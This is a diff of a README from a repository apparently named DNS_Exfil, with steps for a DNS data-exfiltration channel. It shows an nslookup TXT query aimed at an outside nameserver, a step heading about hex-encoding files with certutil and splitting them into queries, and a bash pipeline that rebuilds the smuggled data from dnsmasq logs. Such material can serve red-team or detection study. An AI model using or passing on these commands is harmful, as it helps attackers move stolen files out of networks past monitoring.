@@ -67,12 +67,24 @@ ns2.bhealthen.com
 **TTL:** 60  
 
 ## Step 8: Use CMD to nslookup as a test
-nslookup -q=TXT 9April2024.234234123123453asdf234sadfsadfasdf.com ns1.bhealthen.com  
-  
-![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/89bfb3a5-1bda-498f-934b-9d6f386d5dba)
+nslookup -q=TXT 12332145343dafdsa234234123123453asdf234sadfsadfasdf ns1.bhealthen.com  
+
+![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/79dc6562-8f73-41bd-89ac-9db7701c0946)
 
 
 ## Step 9: Check your DNS logs in EC2
 sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"  
 
-![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/1750f55f-6cfb-432d-9ecd-43c220f37417)
+![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/ff2684c5-136f-4ab2-8da7-88c17f0aa1a2)
+
+
+## Step 10: Create a BATCH file to certutil hex a file, split it, then nslookup
+
+
+
+## Step 11: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
+
+sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g'
+
+![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/68856338-b515-43e4-a873-d86df3ca9b27)
+
